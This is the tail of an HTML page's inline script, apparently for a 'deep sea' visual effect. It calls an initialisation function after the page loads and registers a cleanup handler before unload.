      // ─── AUTO-START ──────────────────────────────────────────
      if (document.readyState === 'complete') {
        setTimeout(initDeepSea, 1000);
      } else {
        window.addEventListener('load', () => {
          setTimeout(initDeepSea, 1000);
        });
      }

      window.addEventListener('beforeunload', cleanup);

    })();
  </script>
</body>
</html>
